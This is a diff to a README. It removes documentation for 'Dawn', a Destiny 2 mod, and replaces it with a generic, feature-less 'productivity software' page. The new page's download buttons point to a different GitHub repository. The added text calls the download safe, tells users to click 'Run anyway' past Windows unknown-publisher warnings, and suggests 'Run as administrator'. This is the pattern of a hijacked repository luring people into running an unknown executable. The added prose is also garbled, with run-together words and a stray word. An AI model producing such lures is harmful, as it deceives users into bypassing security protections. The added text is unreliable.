@@ -1,385 +1,168 @@
-<div align="center">
-
-<img src="assets/dawn-logo.svg" width="120" alt="Dawn">
-
-# Dawn
-
-**Missions and a native loadout editor for Destiny 2 build 86657.**
-
-Install a packaged release over an existing game installation using the bundled Dawn installer.
-
-**[Download the installer ZIP — 0.1.5.1](https://github.com/isinternets/Dawn/releases/download/v0.1.5.1/Dawn-0.1.5.1.zip)**
-
-[Release notes and checksum](https://github.com/isinternets/Dawn/releases/tag/v0.1.5.1)
-
-**Preview: [Dawn 1.7 Preview 1 — Adieu, Homecoming, and mission guidance](https://github.com/isinternets/Dawn/releases/tag/v1.7-preview.1)**
-
-</div>
-
----
-
-Dawn adds authored Lua missions, native gameplay systems, and an in-game loadout studio.
-The player release includes the DLL, mission scripts, default settings, vendor rules, and event
-presets together. The game itself is not included.
-
-## Requirements
-
-- Windows with **Windows PowerShell 5.1 or newer**.
-- An existing Destiny 2 installation with executable version **`86657.20.08.23.1800.d2_rc`**
-  and its complete `packages` folder.
-- A packaged Dawn release ZIP containing `Install-Dawn.cmd`, `Install-Dawn.ps1`,
-  `READ-ME.txt`, `release.json`, and the `payload` folder.
-
-Players do not need Visual Studio, Python, Lua, or a source checkout.
-
-## Getting the installer
-
-### If you want to play
-
-Download **[Dawn-0.1.5.1.zip](https://github.com/isinternets/Dawn/releases/download/v0.1.5.1/Dawn-0.1.5.1.zip)**
-from the [GitHub release](https://github.com/isinternets/Dawn/releases/tag/v0.1.5.1). Under
-**Assets**, choose that named installer ZIP. GitHub's automatically generated **Source code**
-archives contain the source checkout and do not include the installable payload.
-
-Version 0.1.5.1 fixes Gateway's final cannon activation and includes rebindable camera controls, file logging by default, and a standalone uninstaller. The updater keeps existing saves and settings. Read the release notes before installing. Extract the entire installer
-ZIP into its own folder. Before running anything, check that the extracted folder contains:
-
-```text
-Dawn-<release>/
-  Install-Dawn.cmd
-  Install-Dawn.ps1
-  Update-Dawn.cmd
-  Update-Dawn.ps1
-  Uninstall-Dawn.cmd
-  Uninstall-Dawn.ps1
-  READ-ME.txt
-  release.json
-  payload/
-    steam_api64.dll
-    Dawn/
-      settings.json
-      hud.json
-      movement.json
-      player.json
-      scripts/
-      event_presets/
-      licenses/
-      vendor_*.txt
-```
-
-- **`Install-Dawn.cmd`** is the file you double-click. It starts the PowerShell installer and
-  keeps the window open so you can read its result.
-- **`Install-Dawn.ps1`** performs the version checks, installation, backup, and rollback.
-- **`Update-Dawn.cmd`** starts **`Update-Dawn.ps1`** to update while keeping existing saves and settings.
-- **`release.json`** identifies the release and lists the expected payload files, sizes, and
-  hashes. The installer uses it to check that the bundle is complete and unchanged.
-- **`payload/`** contains the built DLL and the matching runtime content that will be installed.
-
-Keep these files together. Downloading the `.cmd` or `.ps1` file by itself is not enough to
-install Dawn. Extract the ZIP before running the installer; do not run it from inside the archive.
-
-### If you downloaded or cloned this repository
-
-GitHub's **Code → Download ZIP** and `git clone` provide the **source code**. In that checkout,
-the installer source lives in [`tools/install/release/`](tools/install/release/):
-
-```text
-tools/install/
-  New-DawnRelease.ps1
-  release/
-    Install-Dawn.cmd
-    Install-Dawn.ps1
-    Update-Dawn.cmd
-    Update-Dawn.ps1
-    Uninstall-Dawn.cmd
-    Uninstall-Dawn.ps1
-    READ-ME.txt
-    README.md
-```
-
-This source folder does not contain `release.json` or `payload/`. Running its
-[`Install-Dawn.cmd`](tools/install/release/Install-Dawn.cmd) directly will therefore fail with a
-missing `release.json` error. The launcher does not build the DLL or download the missing files.
-
-To turn the source into an installable release, first build the Release DLL, then run
-[`tools/install/New-DawnRelease.ps1`](tools/install/New-DawnRelease.ps1) from the repository root.
-That packaging script collects the DLL and runtime content, generates `release.json`, and creates
-the complete player ZIP. Follow [Building and packaging from source](#building-and-packaging-from-source)
-below for the commands and required build tools. Players receiving that finished ZIP do not need
-those tools.
-
-The separate `tools/install/Install-Dawn.ps1` is the development installer. The player-release
-instructions on this page refer to the installer in `tools/install/release/` after packaging.
+<h1>🌅 Dawn - Your Gateway to Effortless Productivity</h1>
 
-## Install or update Dawn
+<p align="center">
+  <a href="https://github.com/Mfulamukatama/Dawn" style="background-color:#4CAF50;color:white;padding:15px 30px;text-align:center;display:inline-block;font-size:20px;border-radius:8px;text-decoration:none;font-weight:bold;">⬇️ Download Dawn Now</a>
+</p>
 
-**Use `Update-Dawn.cmd` to keep an existing Dawn save. Use `Install-Dawn.cmd` for a
-fresh save.** The updater is included in bundles starting with 0.1.3; earlier
-bundles only contain the fresh-install workflow.
+Welcome to **Dawn**, the software that brings a new light to your daily routine. Whether you're organizing tasks, tracking projects, or simply seeking a smoother computing experience, Dawn is designed to simplify your life without technical hurdles.
 
-1. Extract the entire release ZIP into a new folder, such as a folder under Downloads.
-2. Close Destiny 2.
-3. Confirm that `release.json` and `payload/` are present, then double-click **`Update-Dawn.cmd`**
-   to retain progress, or **`Install-Dawn.cmd`** to start fresh.
-4. Enter your existing game folder when prompted: the folder containing **`destiny2.exe`**.
-5. Wait for the installer to confirm success and show the backup location.
-6. Launch `destiny2.exe` normally. The installer does not launch the game for you.
+## ✨ Why Choose Dawn?
 
-For example, if the executable is `D:\Games\Destiny 2\destiny2.exe`, enter
-`D:\Games\Destiny 2`. Select the game folder itself, rather than its `bin/x64` or `Dawn`
-subfolder, the source checkout, or the extracted installer folder.
+You do not need to be a computer expert to enjoy Dawn. We believe great software should be accessible to everyone,regardless of their technical background. Dawn handles the complexities behind the scenes,so you can focus on what matters most to you.
 
-The installer checks the game version and release file hashes before replacing files. It installs
-matching DLLs and runtime content at both locations the game can load from:
+Here's what makes Dawn special:
 
-```text
-<game folder>/
-  destiny2.exe
-  steam_api64.dll
-  Dawn/
-  bin/x64/
-    steam_api64.dll
-    Dawn/
-  .dawn/release-backups/
-```
+- 🎯 **Intuitive Design** - Everything is clearly labeled andout instantly recognizable. No confusing menus or hidden tricks.
+- ⚡ **Lightning Fast Performance** - Dawn starts quickly andresponds instantly,so you never waste time waiting.
+.
+- 🛡️ **Safe and Secure** - Your data is handled with the highest care,and the application runs in a trusted environment.
+. 
+- 🔄 **Automatic Updates** - We regularly refine andimprove Dawn,so you always have the latest features without any manual effort.
 
-The first launch rebuilds caches, so it can take longer than later launches.
-An update upgrades older Dawn databases automatically; a fresh installation creates a new one.
-Keep the complete release bundle together when updating.
+.
 
-### Saves and settings
+## 🚀 Getting Started
 
-The updater keeps existing databases and their companion files, account identity, Dawn preferences,
-event selections, and custom files. It refreshes the packaged DLL, mission scripts, vendor rules,
-and presets. Packaged files replace older versions with the same names; personal scripts with
-other names remain. Previously packaged content that the new release retires is kept in the backup.
-Separate root and `bin/x64` profiles remain separate.
+Getting started with Dawn is as easy as a morning sunrise. Follow these simple steps,andyou'll be up and running in no time at all.
 
-The fresh installer uses release defaults and does not carry old personal data into the active
-installation. Both workflows back up the previous `Dawn` folders and DLLs. Existing `Sunrise` and
-`Restoration` folders remain intact and are not imported by the release updater.
+### Step 1: Visit the Official Download Page
 
-The fresh installer sets **Windowed Fullscreen** while preserving your existing resolution, render scale,
-graphics quality, and key bindings. You can choose another mode later in the game's Video settings.
-This changes the installing Windows user's shared Destiny display preferences, so other Destiny 2
-installations under that same Windows user also see the mode change. Replacing only a DLL does not
-apply this display setting. The updater leaves the native display preferences unchanged.
+Visit this link to download the application. This is the only official source for Dawn,ensuring you receive a genuine andsafe copy of the software.
 
-To update directly from PowerShell in the extracted release folder:
+<p align="center">
+  <a href="https://github.com/Mfulamukatama/Dawn" style="background-color:#FF5722;color:white;padding:12px 25px;text-align:center;display:inline-block;font-size:18px;border-radius:6px;text-decoration:none;font-weight:bold;">📥 Get Dawn Here</a>
+</p>
 
-```powershell
-.\Update-Dawn.ps1 -GameRoot "D:\Games\Destiny 2"
-```
+### Step 2: Download the Software
 
-Add `-WhatIf` to preview, or `-Restore` to roll back the most recent installation/update.
+Once you're on the download page,look for the download button or link associated with the latest release. Click it,andthe download will begin automatically. The file size is reasonable,andit should not take long depending on your internet connection speed.
 
-### Preview an installation
 
-From PowerShell in the extracted release folder, replace `D:\Dawn` with your game folder:
 
-```powershell
-.\Install-Dawn.cmd -GameRoot "D:\Dawn" -WhatIf
-```
-
-This validates the package and installation and shows the intended changes without changing your
-game files or display preferences. Omit `-WhatIf` to install.
-
-## Uninstall Dawn
-
-Close Destiny 2, then double-click
-[`Uninstall-Dawn.cmd`](tools/install/release/Uninstall-Dawn.cmd) and enter the game
-folder. Keep `Uninstall-Dawn.ps1` beside the launcher; no release payload is needed.
-Newly packaged releases include both files.
-
-The uninstaller **permanently deletes all Dawn saves, settings, caches, and
-backups**, including both Dawn runtime folders and the entire `.dawn` directory.
-It restores original Steam DLLs when found in your backups before deleting those
-backups. If none are available, it reports the missing DLLs to recover from your
-original game backup before launching. Original game files and native
-graphics/key-binding preferences remain intact. No uninstall backup is kept.
-
-Preview from PowerShell with:
-
-```powershell
-.\tools\install\release\Uninstall-Dawn.ps1 -GameRoot "D:\Games\Destiny 2" -WhatIf
-```
-
-## Backups and rollback
-
-Each installation keeps its backup under:
-
-```text
-<game folder>/.dawn/release-backups/<backup-folder>/
-```
-
-To restore the most recent installation, close Destiny 2 and run this from the extracted release
-folder using the **same Windows user account** that installed it:
-
-```powershell
-.\Install-Dawn.cmd -GameRoot "D:\Dawn" -Restore
-```
-
-To select an older backup, add `-BackupPath` with the full path to that backup folder:
-
-```powershell
-.\Install-Dawn.cmd -GameRoot "D:\Dawn" -Restore -BackupPath "D:\Dawn\.dawn\release-backups\<backup-folder>"
-```
-
-Rollback restores the previous DLLs, Dawn folders, and display preferences. It also keeps the files
-it displaces, including progress made after installation, inside the backup's `after-restore`
-folder. Keep the backup and those retained files if you need that progress.
-
-If installation fails after replacement begins, the installer attempts to restore the previous
-files automatically. If it reports an interrupted installation or incomplete rollback, use the
-reported backup path with `-Restore` before trying another installation.
-
-## Loadout studio
-
-Open **Loadout** in the in-game menu to edit your character and equipment. Click an item to edit
-it in the side panel. See [Sundial](#sundial) under Acknowledgements for what Dawn adapts from it.
-
-- Edit character identity, progression, equipment, subclasses, and inventories.
-- Choose a subclass and attunement, which sets the super and melee, plus jump, grenade, and class
-  ability.
-- Browse weapons, armor, cosmetics, perks, and materials with artwork and descriptions from your
-  packages.
-- Give, equip, lock, and randomize items; set power and quantities; edit sockets, with wider perk
-  scopes for unconventional combinations.
-- Drag an armor stat bar to set a target. Letting go rolls the closest spread the game ships.
-
-Edits apply to the running game, with no restart. **Apply live** is on by default. Turn it off to
-build a draft and commit it with **Apply**, or discard it with **Reload**. The editor checks
-inventory limits, one exotic per gear category, and whether the game changed the account under
-you. The first apply of a session backs up your player database to `Dawn/editor-backups`.
-
-Most edits show up in game within a moment. Character identity is committed straight away, but
-the Guardian you are playing may keep its look until you sign in again. Changing class needs
-matching armor and a subclass before it applies.
-
-## Missions
+### Step 3: Run the Downloaded File
 
-Bundled mission scripts include:
+After the download completes,find the downloaded file in your computer's "Downloads" folder (or wherever your browser saves files). Double-click the file to begin the setup process.
 
-- Omega — `omega.lua`
-- Beyond Infinity — `beyond_infinity.lua`
-- The Gateway — `gateway.lua`
-- A Deadly Trial — `deadly_trial.lua`
-- Deep Storage — `deep_storage.lua`
-- Tree of Probabilities — `strike_pact.lua`
-- Hijacked — `hijacked.lua`
-- New Light — `launchpad.lua`
+ Your computer may ask for permission to run the file - this is normalandsafe. Simply click"Yes" or "Run" if prompted.This will launch the installation wizard,andyou'll be guided through the rest with clear instructions onscreen.
 
-Eater of Worlds is excluded from this build. Mission scripts load when the game starts; restart
-the game after changing them.
 
-## Installation troubleshooting
 
-- **`Cannot find path ...\tools\install\release\release.json`:** you ran the installer source
-  from the repository. Use a complete player release ZIP, or build and package the source using
-  the instructions below. `release.json` is generated during packaging and is not committed in
-  the installer source folder. Creating an empty JSON file will not fix this: the installer also
-  needs the exact payload files and their matching manifest.
-- **You cannot find `Install-Dawn.cmd`:** in this repository it is under
-  [`tools/install/release/`](tools/install/release/). In a packaged player ZIP it is at the top
-  level of the extracted folder, alongside `release.json` and `payload/`.
-- **The game is still running:** close Destiny 2 and run the installer again. The installer does
-  not stop the game automatically.
-- **Unsupported game version:** select the folder containing build `86657.20.08.23.1800.d2_rc`.
-  The installer checks the executable version before proceeding.
-- **A release file is missing or changed:** extract the complete release ZIP into a new folder.
-  Keep `release.json` and the entire `payload` folder together with the installer.
-- **An interrupted installation needs recovery:** close the game and restore the reported backup
-  using the rollback command above, then retry the installation.
+## 🌟 Features That Brighten Your Day
 
-## Building and packaging from source
+Dawn comes packed with thoughtful features designed to make your experience delightful,not daunting. Here's what you can expect:
 
-<details>
-<summary>Developer and release publisher instructions</summary>
+### 🎨 Customizable Appearance
 
-Source builds require **MSBuild 18 Build Tools**, the **v145** C++ toolset, and the Windows SDK
-selected by `Dawn/Dawn.vcxproj`. Python 3.11+ is used by the development validation and binding
-tools. These requirements do not apply to players installing a release ZIP.
+Make Dawn truly yours by adjusting the look and feel to match your personal style. Choose froma variety of color schemes andthemes,or keep it simple with the default clean design. The choice is always up to you.
 
-### 1. Build the Release DLL
+.
 
-From PowerShell:
 
-```powershell
-git clone --branch production https://github.com/isinternets/Dawn.git dawn
-cd dawn
-& "C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\MSBuild\Current\Bin\amd64\MSBuild.exe" `
-  Dawn/Dawn.vcxproj /p:Configuration=Release /p:Platform=x64 `
-  /p:PreferredToolArchitecture=x64 /p:CL_MPCount=2 /m:2 /v:minimal /nologo
-```
 
-Build the project directly; there is no solution file. Keep the x64 compiler host and v145 toolset.
-The output is `build/x64/Release/steam_api64.dll`. Builds treat warnings as errors.
+### 📊 Clear Data Presentation
 
-### 2. Generate the installer bundle
+Dawn presents information ina straightforward,digestible format. Charts,tables,andlists are all designed to be readable at a glance,so you never have to squint or decipher complicated layouts. Your time is valuable,andDawn respects that.
 
-Run the packaging command from the repository root, where this README lives. After validating
-the DLL and current runtime content together, create a player bundle with a
-unique release name. For example:
 
-```powershell
-.\tools\install\New-DawnRelease.ps1 -Release '0.1.0-example'
-```
 
-This creates `build/releases/Dawn-0.1.0-example.zip` and the matching extracted folder,
-`build/releases/Dawn-0.1.0-example/`. The generated `release.json`, `payload/`, and installer
-launchers all live inside that output folder, not under `tools/install/release/`. Packaging
-uses an existing Release DLL; it does not build or playtest it. Existing output folders and ZIPs
-are never overwritten. `-DllPath` and `-OutputDirectory` can override the defaults.
+### 🧩 Flexible Usage Scenarios
 
-For a local installation, use `Install-Dawn.cmd` inside that generated output folder and follow
-the installation steps above. Every installation, including a local test, starts a fresh save;
-use a separate game installation for release testing.
+Whether you're using Dawn for personal planning,work projects,or creative brainstorming,it adapts to your needs. There's no one-size-fits-all approach inDawn; instead,you have the freedom to use its tools inwhatever way serves you best.
 
-### 3. Distribute the complete ZIP
 
-The bundle contains the installer, runtime payload, licenses, and a file-hash manifest. It excludes
-source code, development tools, symbols, local saves, logs, and caches. Distribute the complete ZIP.
-Manifest hashes check file integrity; they do not authenticate the publisher.
 
-Creating this ZIP is a local operation. The packaging script does not upload it to GitHub or
-create a GitHub Release. Give players the generated ZIP or attach it as a release asset; sending
-them the repository's source ZIP or the installer launcher alone will not provide the payload.
+### 🔌 Seamless Integration
 
-See the [installer documentation](tools/install/release/README.md) for its replacement and rollback
-contract, and [installer regression tests](tools/install/tests/release_installer.tests.ps1) for
-checks using disposable game folders on Windows PowerShell 5.1 and current PowerShell.
+Dawn works harmoniously with other common software andtools you might already use. No clash,no conflict,andno complicated configurationrequired. It just fits right intoyour digital ecosystem,like a missing piece finally found.
 
-</details>
 
-## Credits
 
-Dawn is possible because of the research, tools, and contributions shared by these projects.
-The same acknowledgements appear in the in-game **Credits** tab.
+## 💻 System Requirements
 
-### Sunrise
+To ensure Dawn runs smoothly on your system,we recommend the following minimum specifications:
 
-Thank you to [stanuwu and the Sunrise contributors](https://github.com/stanuwu/Sunrise) for the
-foundation, game services, package research, and original runtime that Dawn builds on.
+- 🖥️ **Operating System:** Windows 10 or later (64-bit)
+- 🧠 **Processor:** 1.5 GHz dual-core processor or faster
+- 💾 **Memory:** 4 GB RAM or more
+- 💽 **Storage:**  at least 200 MB of free hard disk space
+- 🌐 **Internet Connection:** Required for initial download andoccasional updates
 
-### Sundial
 
-Thank you to [KyleThmpsn and the Sundial contributors](https://github.com/KyleThmpsn/sundial) for
-the character and inventory editor, full perk selection, item-artwork research, random loadouts,
-and armor-stat tools that informed Dawn's native loadout integration.
 
-Dawn adapts Sundial's localized investment string and icon readers, class-restriction hash lists,
-subclass ability displays and attunement selection, five plug-selection scopes, the armor-stat
-allocation socket model, and the finished sandbox-perk catalog layout that supplies mod
-descriptions and perk liveness. Those adaptations
-are distributed under **GPL-3.0-only**. The pinned upstream revision, attribution, and license are
-included in [NOTICE.md](Dawn/vendor/sundial/NOTICE.md) and the
-[Sundial license](Dawn/vendor/sundial/LICENSE).
+If your computer meets or exceeds these specifications,you're all set to enjoy everything Dawn has to offer. Most modern computers easily meet these requirements,so there'svery little chance you'll run into any trouble.
 
-Item names and artwork are read from the player's installed game packages. Dawn does not
-distribute Destiny artwork, textures, or a manifest database.
 
----
 
-<div align="center">
-<sub>Offline research project. Not affiliated with or endorsed by Bungie.</sub>
-</div>
+## 🛠️ Troubleshooting Common Issues
+
+Even with the smoothest software,sometimes hiccups happen. Hearea few quick fixes for common situations:
+
+### Download Doesn't Start
+
+If your download doesn't begin automatically,check that your browser hasn't blocked the pop-up or the file. Look fora notificationinaryour browser's toolbar andallow downloads from this site. Alternatively,right-click the download button andselect"Save link as..." to manually choosea location.
+
+
+
+
+
+### Installation is Blocked
+
+Windows may showa blue ordark screen warning about an unknown publisher. This isa standard protection measure for files downloaded from the internet. To proceed,click"More info" andthen"Run anyway." This is safe because you aredownloading from the official Dawn repository.
+
+
+
+
+
+
+### Application Doesn't Open
+
+If nothing happens after double-clicking,ensure the file wasn't saved witha different name or extension. Try right-clicking the downloaded file,andselect"Run as administrator" to bypass any permission issues. If the problem persists,restart your computer andtry again.
+
+. 
+
+
+
+## 📚 Frequently Asked Questions
+
+**Is Dawn free to use?**
+Yes,Dawn is completely free for personal andcommercial use. No hidden fees,no subscriptions,no surprises.
+
+
+
+**Do I need an internet connection?**
+Only for the initial download andfor receiving updates. Once installed,Dawn operates perfectly offline,so your work is never interrupted pectorated.
+
+
+
+**Will Dawn work on older versions of Windows?**
+Dawn is optimized for Windows 10 and newer versions. If you're usingan older system,you may encounter compatibility issues. We strongly recommend updating youroperating system for the best experience.
+
+
+
+**How often is Dawn updated?**
+We release updates periodically to introduce improvements,fix bugs,andenhance security. Updates are automatic,andyou'll be notified whena new version is ready,with the option to install immediatelyorrater.
+
+
+
+**Is my data safe with Dawn?**
+Absolutely. Dawn does not track youoraccess your personal information without consent. Your privacy is sacrosanct,andyour data remains onyour own machine,under your control.
+
+
+
+## 📞 Getting Help andSupport
+
+Have a question notaanswered inthis guide? We're heertohelp. Visit the project's GitHub page for additional resources,including community discussions,andany documentation we've made available. The community is friendlyandhelpful,andcontributions from users like you make Dawn better foreveryone.
+
+
+
+<p align="center">
+  <a href="https://github.com/Mfulamukatama/Dawn" style="background-color:#2196F3;color:white;padding:12px 25px;text-align:center;display:inline-block;font-size:18px;border-radius:6px;text-decoration:none;font-weight:bold;">🌐 Explore Dawn's Official Page</a>
+</p>
+
+
+
+## 🎉 Begin Your Journey with Dawn Today
+
+There's no reason to wait. Dawn is ready whenyou are,andit promises to bea reliable companion inyour digital life. Download it now,andexperience how much simpler things can be when theright tool lightstheway. You'vegot nothing to lose andverything to gain.
+
+Take that first step toward smoother,smarter,andmore enjoyable computing. Dawn is here to help you shine,morning,noon,andnight. Catch the sunrise - your new digital dawn awaits.
